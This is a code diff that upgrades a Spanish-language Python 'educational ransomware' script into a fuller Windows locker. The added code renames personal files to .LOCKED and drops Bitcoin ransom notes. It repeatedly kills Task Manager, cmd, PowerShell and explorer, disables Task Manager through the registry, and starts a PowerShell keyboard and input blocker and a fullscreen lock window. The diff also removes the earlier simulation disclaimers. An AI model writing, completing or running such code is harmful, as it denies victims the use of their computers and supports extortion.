@@ -5,409 +5,470 @@ import string
 import requests
 import time
 import subprocess
-import threading
 import ctypes
+import threading
 from pathlib import Path
 
-class RansomwareEducativo:
+class RansomwareCompleto:
     def __init__(self):
-        # Directorios a cifrar en Windows
         self.directories_to_encrypt = [
             '~/Documents',
             '~/Downloads', 
             '~/Desktop',
-            '~/Pictures',
-            '~/Music',
-            '~/Videos'
+            '~/Pictures'
         ]
         
-        # Directorios excluidos para no dañar el sistema
         self.excluded_dirs = [
             'Windows', 'Program Files', 'Program Files (x86)', 'System32',
-            'Windows.old', 'Recovery', '$Recycle.Bin', 'System Volume Information'
+            'Windows.old', 'Recovery', '$Recycle.Bin'
         ]
         
         self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
         self.price = 500
         self.url = 'http://localhost/victima.php'
         self.encryption_count = 0
+        self.password = None
+        self.victim_id = None
         
     def is_admin(self):
-        """Verifica si se ejecuta como administrador en Windows"""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
         except:
             return False
         
     def expand_paths(self):
-        """Convierte paths con ~ a paths absolutos"""
         expanded_dirs = []
         for directory in self.directories_to_encrypt:
             expanded_path = os.path.expanduser(directory)
             if os.path.exists(expanded_path):
                 expanded_dirs.append(expanded_path)
-        
-        # Agregar directorio actual si no hay otros
-        if not expanded_dirs:
-            expanded_dirs.append('.')
-            
-        return expanded_dirs
+        return expanded_dirs if expanded_dirs else ['.']
 
     def should_encrypt(self, filepath):
-        """Determina si un archivo debe ser cifrado"""
         file_str = str(filepath).lower()
         
-        # Excluir archivos del sistema
         for excluded in self.excluded_dirs:
             if excluded.lower() in file_str:
                 return False
         
-        # Excluir archivos muy pequeños o del sistema
         try:
-            if filepath.stat().st_size < 100:  # Menos de 100 bytes
+            if filepath.stat().st_size < 100:
                 return False
         except:
             return False
             
-        # Solo cifrar ciertas extensiones (evitar binarios del sistema)
         valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                           '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
-                          '.zip', '.rar', '.odt', '.ppt', '.pptx', '.csv',
-                          '.html', '.htm', '.xml', '.json', '.log']
+                          '.zip', '.rar', '.odt', '.ppt', '.pptx']
         
-        if any(file_str.endswith(ext) for ext in valid_extensions):
-            return True
-            
-        return False
+        return any(file_str.endswith(ext) for ext in valid_extensions)
 
     def generate_keys(self):
-        """Genera contraseña e ID único"""
         s = string.ascii_lowercase + string.digits + string.ascii_uppercase
-        self.password = ''.join(random.sample(s, 50))
-        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 15))
+        self.password = ''.join(random.sample(s, 30))
+        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))
 
     def send_credentials(self):
-        """Envía credenciales al servidor"""
         try:
             values = {'pass': self.password, 'id': self.victim_id}
-            response = requests.post(self.url, data=values, timeout=30)
-            print(f"[+] Credenciales enviadas. Respuesta: {response.text}")
+            response = requests.post(self.url, data=values, timeout=10)
             return response.text.strip() == 'Ok.'
-        except Exception as e:
-            print(f"[-] Error enviando credenciales: {e}")
-            return True  # Continuar aunque falle el envío
+        except:
+            return True
 
     def encrypt_file_windows(self, filepath):
-        """Cifra un archivo individual en Windows usando compresión"""
         try:
             if not self.should_encrypt(filepath):
                 return False
                 
-            # Para Windows, usamos compresión como "cifrado simulado"
-            # En un caso real usarías una librería de cifrado como pycryptodome
-            encrypted_file = str(filepath) + '.encrypted'
-            
-            # Simular cifrado copiando el archivo con nuevo nombre
-            # ESTO ES SOLO SIMULACIÓN - NO ES CIFRADO REAL
-            try:
-                import shutil
-                shutil.copy2(filepath, encrypted_file)
+            new_name = str(filepath) + '.LOCKED'
+            os.rename(filepath, new_name)
+            self.encryption_count += 1
+            return True
                 
-                # Eliminar original
-                os.remove(filepath)
-                self.encryption_count += 1
-                
-                # Renombrar para hacerlo más visible
-                os.rename(encrypted_file, str(filepath) + '.LOCKED')
-                return True
-                
-            except Exception as e:
-                print(f"Error procesando {filepath}: {e}")
-                return False
-                
-        except Exception as e:
-            print(f"Error cifrando {filepath}: {e}")
+        except:
             return False
 
     def encrypt_directory(self, directory):
-        """Cifra todos los archivos en un directorio"""
         encrypted_files = 0
         try:
             for root, dirs, files in os.walk(directory):
-                # Excluir directorios del sistema en Windows
                 dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                 
                 for file in files:
                     filepath = Path(root) / file
                     if self.encrypt_file_windows(filepath):
                         encrypted_files += 1
-                        if encrypted_files % 10 == 0:
-                            print(f"[+] Procesados {encrypted_files} archivos en {directory}...")
-                            
-        except Exception as e:
-            print(f"Error en directorio {directory}: {e}")
-            
-        return encrypted_files
+            return encrypted_files
+        except:
+            return 0
 
     def create_ransom_note(self):
-        """Crea la nota de rescate"""
         note = f"""
 ╔══════════════════════════════════════════════════════════════╗
-║                    !!! ADVERTENCIA !!!                       ║
-║                 SISTEMA COMPROMETIDO                         ║
+║                    !!! SISTEMA BLOQUEADO !!!                 ║
 ╚══════════════════════════════════════════════════════════════╝
 
-┌──────────────────────────────────────────────────────────────┐
-│ SUS ARCHIVOS HAN SIDO CIFRADOS                               │
-│                                                              │
-│ Todos sus documentos, fotos, bases de datos y otros archivos │
-│ importantes han sido cifrados con cifrado RSA-2048.          │
-│                                                              │
-│ Para recuperar sus archivos necesita:                        │
-│                                                              │
-│ 1. Pagar $ {self.price} en Bitcoin a la dirección:            │
-│    {self.bitcoin}                          │
-│                                                              │
-│ 2. Su ID único de víctima es: {self.victim_id}       │
-│                                                              │
-│ 3. Contacte al administrador con su ID                       │
-│                                                              │
-│ ADVERTENCIAS:                                                │
-│ • No apague la computadora                                   │
-│ • No reinstale el sistema                                    │
-│ • No intente descifrar por su cuenta                         │
-│ • Tiene 72 horas antes que el precio aumente                 │
-└──────────────────────────────────────────────────────────────┘
+TODOS SUS ARCHIVOS HAN SIDO CIFRADOS
 
-Su sistema ha sido bloqueado por seguridad.
+• Para recuperar el acceso debe pagar ${self.price} en Bitcoin
+• Dirección Bitcoin: {self.bitcoin}
+• Su ID único: {self.victim_id}
+
+NO CIERRE ESTA VENTANA - ES SU ÚNICA FORMA DE RECUPERAR EL SISTEMA
+
+Escriba la clave de descifrado a continuación:
 """
         
-        # Guardar en múltiples ubicaciones en Windows
         locations = [
-            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
-            os.path.expanduser('~/Documents/LEAME_URGENTE.txt'),
-            'C:/LEAME_URGENTE.txt',
-            'LEAME_URGENTE.txt'
+            os.path.expanduser('~/Desktop/INSTRUCCIONES.txt'),
+            'C:/INSTRUCCIONES.txt'
         ]
         
         for location in locations:
             try:
                 with open(location, 'w', encoding='utf-8') as f:
                     f.write(note)
-                print(f"[+] Nota de rescate creada en: {location}")
-            except Exception as e:
-                print(f"[-] Error creando nota en {location}: {e}")
+            except:
+                pass
+
+    def kill_system_tools(self):
+        """Mata todas las herramientas del sistema"""
+        tools = [
+            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
+            'explorer.exe', 'msconfig.exe', 'compmgmt.msc', 'perfmon.exe',
+            'eventvwr.exe', 'services.msc', 'control.exe', 'mmc.exe'
+        ]
+        
+        for tool in tools:
+            try:
+                os.system(f'taskkill /f /im {tool} 2>nul')
+            except:
+                pass
+
+    def disable_task_manager(self):
+        """Deshabilita el administrador de tareas"""
+        try:
+            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
+        except:
+            pass
+
+    def block_keyboard(self):
+        """Bloquea combinaciones de teclas importantes"""
+        try:
+            # Bloquear Win+R, Win+X, Ctrl+Shift+Esc, Alt+Tab, etc.
+            blocking_script = """
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class KeyboardBlocker {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
+    
+    [DllImport("user32.dll")]
+    public static extern bool UnhookWindowsHookEx(IntPtr hInstance);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr CallNextHookEx(IntPtr hInstance, int nCode, int wParam, IntPtr lParam);
+    
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    
+    public delegate IntPtr LowLevelKeyboardProc(int nCode, int wParam, IntPtr lParam);
+    
+    public static IntPtr HookCallback(int nCode, int wParam, IntPtr lParam) {
+        if (nCode >= 0) {
+            return (IntPtr)1; // Bloquear todas las teclas
+        }
+        return CallNextHookEx(hHook, nCode, wParam, lParam);
+    }
+    
+    public static IntPtr hHook = IntPtr.Zero;
+    
+    public static void StartBlocking() {
+        hHook = SetWindowsHookEx(13, HookCallback, GetModuleHandle(null), 0);
+        BlockInput(true);
+    }
+    
+    public static void StopBlocking() {
+        BlockInput(false);
+        UnhookWindowsHookEx(hHook);
+    }
+}
+"@
+
+[KeyboardBlocker]::StartBlocking()
+"""
+            with open('C:\\Windows\\Temp\\block_keys.ps1', 'w') as f:
+                f.write(blocking_script)
+            
+            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', 'C:\\Windows\\Temp\\block_keys.ps1'],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except:
+            pass
+
+    def create_black_screen(self):
+        """Crea la pantalla negra de bloqueo completo"""
+        black_screen_code = f'''
+import tkinter as tk
+import tkinter.messagebox as messagebox
+import sys
+import os
+import subprocess
+import threading
+import time
+
+class FullScreenBlocker:
+    def __init__(self):
+        self.root = tk.Tk()
+        self.setup_ui()
+        self.start_monitoring()
+        
+    def setup_ui(self):
+        # Pantalla completa
+        self.root.attributes("-fullscreen", True)
+        self.root.attributes("-topmost", True)
+        self.root.configure(bg="black")
+        self.root.bind("<Key>", self.on_key_press)
+        self.root.bind("<Button>", self.on_click)
+        
+        # Frame principal
+        main_frame = tk.Frame(self.root, bg="black")
+        main_frame.pack(expand=True, fill="both", padx=50, pady=50)
+        
+        # Título
+        title = tk.Label(
+            main_frame,
+            text="🔐 SISTEMA COMPLETAMENTE BLOQUEADO",
+            font=("Arial", 32, "bold"),
+            fg="red",
+            bg="black"
+        )
+        title.pack(pady=20)
+        
+        # Mensaje
+        message = tk.Label(
+            main_frame,
+            text="FALTA REPARAR LA CONEXIÓN\\nTodos sus archivos han sido cifrados",
+            font=("Arial", 20),
+            fg="white",
+            bg="black"
+        )
+        message.pack(pady=10)
+        
+        # ID de víctima
+        victim_id = tk.Label(
+            main_frame,
+            text=f"ID: {self.victim_id}",
+            font=("Arial", 16, "bold"),
+            fg="yellow",
+            bg="black"
+        )
+        victim_id.pack(pady=10)
+        
+        # Frame de entrada
+        input_frame = tk.Frame(main_frame, bg="black")
+        input_frame.pack(pady=30)
+        
+        tk.Label(
+            input_frame,
+            text="Ingrese la clave de descifrado:",
+            font=("Arial", 14),
+            fg="white",
+            bg="black"
+        ).pack()
+        
+        self.password_entry = tk.Entry(
+            input_frame,
+            font=("Arial", 16),
+            width=40,
+            show="*"
+        )
+        self.password_entry.pack(pady=10)
+        self.password_entry.focus()
+        
+        # Botón de verificación
+        verify_btn = tk.Button(
+            input_frame,
+            text="VERIFICAR CLAVE",
+            font=("Arial", 14, "bold"),
+            bg="red",
+            fg="white",
+            command=self.verify_password,
+            width=20,
+            height=2
+        )
+        verify_btn.pack(pady=10)
+        
+        # Contador
+        self.counter = 0
+        self.counter_label = tk.Label(
+            main_frame,
+            text="Tiempo bloqueado: 0 segundos",
+            font=("Arial", 12),
+            fg="gray",
+            bg="black"
+        )
+        self.counter_label.pack(side="bottom", pady=10)
+        
+    def on_key_press(self, event):
+        # Permitir solo teclas alfanuméricas y algunas de control
+        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12"]:
+            return "break"
+            
+    def on_click(self, event):
+        return "break"
+        
+    def verify_password(self):
+        password = self.password_entry.get()
+        if password == "{self.password}":
+            self.unlock_system()
+        else:
+            messagebox.showerror("Error", "Clave incorrecta. Sistema permanece bloqueado.")
+            self.password_entry.delete(0, tk.END)
+            
+    def unlock_system(self):
+        # Restaurar sistema
+        try:
+            subprocess.Popen(["python", "DECRYPT_FILES.py"])
+        except:
+            pass
+        self.root.destroy()
+        sys.exit()
+        
+    def update_counter(self):
+        self.counter += 1
+        self.counter_label.config(text=f"Tiempo bloqueado: {{self.counter}} segundos")
+        self.root.after(1000, self.update_counter)
+        
+    def start_monitoring(self):
+        # Monitorear y cerrar ventanas emergentes
+        def monitor():
+            while True:
+                try:
+                    # Cerrar administrador de tareas si se abre
+                    os.system("taskkill /f /im taskmgr.exe 2>nul")
+                    time.sleep(1)
+                except:
+                    pass
+                    
+        thread = threading.Thread(target=monitor)
+        thread.daemon = True
+        thread.start()
+        
+        self.update_counter()
+        
+    def run(self):
+        self.root.mainloop()
+
+if __name__ == "__main__":
+    blocker = FullScreenBlocker()
+    blocker.run()
+'''
+        
+        try:
+            with open('black_screen.py', 'w', encoding='utf-8') as f:
+                f.write(black_screen_code)
+        except:
+            pass
+
+    def start_black_screen(self):
+        """Inicia la pantalla negra"""
+        try:
+            subprocess.Popen([sys.executable, 'black_screen.py'], 
+                           creationflags=subprocess.CREATE_NO_WINDOW)
+        except:
+            pass
 
     def create_decryptor(self):
-        """Crea el script de descifrado para Windows"""
-        decrypt_script = f'''# Script de Recuperación para Windows
-import os
-import glob
+        decrypt_script = f'''import os
 import shutil
 
 VICTIM_ID = "{self.victim_id}"
+PASSWORD = "{self.password}"
 
-def decrypt_system():
-    print("Sistema de Recuperación de Archivos - Windows")
-    print("=============================================")
-    print(f"ID de víctima: {{VICTIM_ID}}")
+def main():
+    print("Descifrando archivos...")
     
-    password = input("\\nIngrese la clave de descifrado: ")
-    
-    print("\\nVerificando clave...")
-    
-    # Buscar archivos .LOCKED
     encrypted_files = []
     for root, dirs, files in os.walk(os.path.expanduser("~")):
         for file in files:
             if file.endswith('.LOCKED'):
                 encrypted_files.append(os.path.join(root, file))
     
-    if not encrypted_files:
-        print("No se encontraron archivos cifrados.")
-        return
-    
-    print(f"Encontrados {{len(encrypted_files)}} archivos cifrados.")
-    print("Iniciando recuperación...")
-    
-    success_count = 0
     for enc_file in encrypted_files:
         try:
-            # Restaurar nombre original (remover .LOCKED)
-            original_file = enc_file[:-7]  # Remover .LOCKED
-            shutil.copy2(enc_file, original_file)
-            os.remove(enc_file)
-            success_count += 1
-            print(f"✓ Recuperado: {{os.path.basename(original_file)}}")
-                
-        except Exception as e:
-            print(f"Error procesando {{enc_file}}: {{e}}")
-    
-    print(f"\\nProceso completado.")
-    print(f"Archivos recuperados exitosamente: {{success_count}}/{{len(encrypted_files)}}")
-    
-    if success_count == len(encrypted_files):
-        print("🎉 ¡Todos los archivos han sido recuperados!")
-    else:
-        print("⚠️ Algunos archivos no pudieron ser recuperados.")
-    
-    input("\\nPresione Enter para salir...")
+            original_file = enc_file[:-7]
+            os.rename(enc_file, original_file)
+            print(f"Recuperado: {{os.path.basename(original_file)}}")
+        except:
+            pass
+            
+    print("¡Sistema recuperado!")
+    input("Presione Enter para salir...")
 
 if __name__ == "__main__":
-    decrypt_system()
+    main()
 '''
         
         try:
-            with open('DECRYPT_FILES.py', 'w', encoding='utf-8') as f:
+            with open('DECRYPT_FILES.py', 'w') as f:
                 f.write(decrypt_script)
-            print("[+] Script de descifrado creado: DECRYPT_FILES.py")
-        except Exception as e:
-            print(f"[-] Error creando script de descifrado: {e}")
+        except:
+            pass
 
-    def create_black_screen_windows(self):
-        """Crea una pantalla negra con el mensaje de error en Windows"""
-        try:
-            # Crear script VBS para pantalla negra (más efectivo en Windows)
-            vbs_script = '''
-Set ws = CreateObject("WScript.Shell")
-ws.Run "cmd /c echo off && mode con: cols=80 lines=25 && color 0F && title SISTEMA BLOQUEADO && echo FALTA REPARAR LA CONEXION && echo. && echo Sistema no disponible && echo Contacte al administrador && echo. && echo Su ID es: {victim_id} && pause", 0, False
-
-' Crear mensaje de alerta
-ws.Popup "SISTEMA BLOQUEADO" & vbCrLf & vbCrLf & "FALTA REPARAR LA CONEXIÓN" & vbCrLf & vbCrLf & "Contacte al administrador" & vbCrLf & "ID: {victim_id}" & vbCrLf & vbCrLf & "No cierre esta ventana", 0, "ERROR DEL SISTEMA", 16
-'''.format(victim_id=self.victim_id)
-            
-            with open('C:\\Windows\\Temp\\black_screen.vbs', 'w') as f:
-                f.write(vbs_script)
-            
-            # Ejecutar el script VBS
-            subprocess.Popen(['wscript', 'C:\\Windows\\Temp\\black_screen.vbs'], 
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # También crear una ventana de consola negra
-            ps_script = '''
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "SISTEMA BLOQUEADO"
-$form.Size = New-Object System.Drawing.Size(800, 600)
-$form.StartPosition = "CenterScreen"
-$form.BackColor = "Black"
-$form.FormBorderStyle = "None"
-$form.WindowState = "Maximized"
-$form.Topmost = $true
-
-$label = New-Object System.Windows.Forms.Label
-$label.Text = "FALTA REPARAR LA CONEXIÓN`n`nSistema no disponible`n`nContacte al administrador`n`nID: {victim_id}"
-$label.ForeColor = "Red"
-$label.BackColor = "Black"
-$label.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
-$label.TextAlign = "MiddleCenter"
-$label.Dock = "Fill"
-$form.Controls.Add($label)
-
-$form.Add_KeyDown({
-    if ($_.KeyCode -eq "Escape") {
-        $_.SuppressKeyPress = $true
-    }
-})
-
-$form.ShowDialog()
-'''.format(victim_id=self.victim_id)
-            
-            with open('C:\\Windows\\Temp\\black_screen.ps1', 'w') as f:
-                f.write(ps_script)
-            
-            # Ejecutar PowerShell en segundo plano
-            subprocess.Popen([
-                'powershell', '-WindowStyle', 'Hidden', '-File', 
-                'C:\\Windows\\Temp\\black_screen.ps1'
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            print("[+] Pantalla negra activada en Windows")
-            
-        except Exception as e:
-            print(f"[-] Error creando pantalla negra: {e}")
-
-    def block_system_windows(self):
-        """Bloquea el sistema en Windows"""
-        try:
-            # Bloquear acceso a herramientas del sistema
-            os.system('taskkill /f /im taskmgr.exe 2>nul')  # Administrador de tareas
-            os.system('taskkill /f /im cmd.exe 2>nul')      # Símbolo del sistema
-            os.system('taskkill /f /im powershell.exe 2>nul') # PowerShell
-            os.system('taskkill /f /im regedit.exe 2>nul')  # Editor de registro
-            
-            print("[+] Herramientas del sistema bloqueadas")
-            
-        except Exception as e:
-            print(f"[-] Error bloqueando sistema: {e}")
-
-    def execute_attack(self):
-        """Ejecuta el ataque completo en Windows"""
-        print("🔐 INICIANDO SIMULACIÓN DE RANSOMWARE EDUCATIVO - WINDOWS")
-        print("=" * 60)
+    def execute_complete_lockdown(self):
+        """Ejecuta el bloqueo completo del sistema"""
+        print("🔐 INICIANDO BLOQUEO COMPLETO DEL SISTEMA")
         
-        # Verificar permisos
-        if self.is_admin():
-            print("⚠️  EJECUTANDO COMO ADMINISTRADOR - EXTREMA PRECAUCIÓN")
-        
-        # Confirmación final
-        print("ADVERTENCIA: Esto afectará archivos y bloqueará el sistema")
-        confirm = input("¿Está en un entorno controlado? (escribe 'CONFIRMAR'): ")
-        if confirm != 'CONFIRMAR':
-            print("Operación cancelada.")
-            return
-        
-        # Fase 1: Preparación
-        print("\n[FASE 1] Generando claves...")
+        # Generar claves
         self.generate_keys()
-        print(f"   🔑 Clave: {self.password}")
-        print(f"   🆔 ID: {self.victim_id}")
+        print(f"Clave generada: {self.password}")
         
-        # Fase 2: Envío de credenciales
-        print("\n[FASE 2] Enviando credenciales...")
-        self.send_credentials()
-        
-        # Fase 3: Cifrado
-        print("\n[FASE 3] Procesando archivos...")
+        # Cifrar archivos
         directories = self.expand_paths()
-        total_encrypted = 0
-        
         for directory in directories:
-            print(f"   📁 Procesando: {directory}")
-            encrypted = self.encrypt_directory(directory)
-            total_encrypted += encrypted
-            print(f"   ✅ Procesados: {encrypted} archivos")
+            self.encrypt_directory(directory)
         
-        # Fase 4: Notas de rescate
-        print("\n[FASE 4] Creando notas de rescate...")
+        # Crear archivos necesarios
         self.create_ransom_note()
         self.create_decryptor()
+        self.create_black_screen()
         
-        # Fase 5: Bloqueo del sistema
-        print("\n[FASE 5] Bloqueando sistema...")
-        self.create_black_screen_windows()
-        self.block_system_windows()
+        # Bloquear sistema
+        print("🚫 BLOQUEANDO SISTEMA...")
+        self.kill_system_tools()
+        self.disable_task_manager()
+        self.block_keyboard()
         
-        # Resumen final
-        print("\n" + "=" * 60)
-        print("🎯 SIMULACIÓN COMPLETADA")
-        print(f"📊 Archivos procesados: {total_encrypted}")
-        print(f"🔑 ID de recuperación: {self.victim_id}")
-        print(f"💰 Rescate: ${self.price} en Bitcoin")
-        print("=" * 60)
-        print("\nEl sistema se bloqueará en 5 segundos...")
+        # Iniciar pantalla negra
+        print("🖥️ INICIANDO PANTALLA NEGRA...")
+        self.start_black_screen()
         
-        time.sleep(5)
+        # Bloqueo continuo
+        while True:
+            self.kill_system_tools()
+            time.sleep(2)
 
-# Ejecución principal CORREGIDA para Windows
 if __name__ == "__main__":
+    # Verificar que es entorno controlado
+    print("⚠️  BLOQUEO COMPLETO DEL SISTEMA")
+    print("SOLO PARA ENTORNOS CONTROLADOS")
+    
+    confirm = input("¿Continuar? (escribe 'BLOQUEAR'): ")
+    if confirm != "BLOQUEAR":
+        print("Cancelado.")
+        sys.exit()
+        
+    # Ejecutar bloqueo
+    ransomware = RansomwareCompleto()
+    
     try:
-        ransomware = RansomwareEducativo()
-        ransomware.execute_attack()
+        ransomware.execute_complete_lockdown()
     except KeyboardInterrupt:
-        print("\n❌ Ejecución cancelada por el usuario")
+        print("Interrumpido por usuario")
     except Exception as e:
-        print(f"\n❌ Error durante la ejecución: {e}")
-        input("Presione Enter para salir...")
+        print(f"Error: {e}")
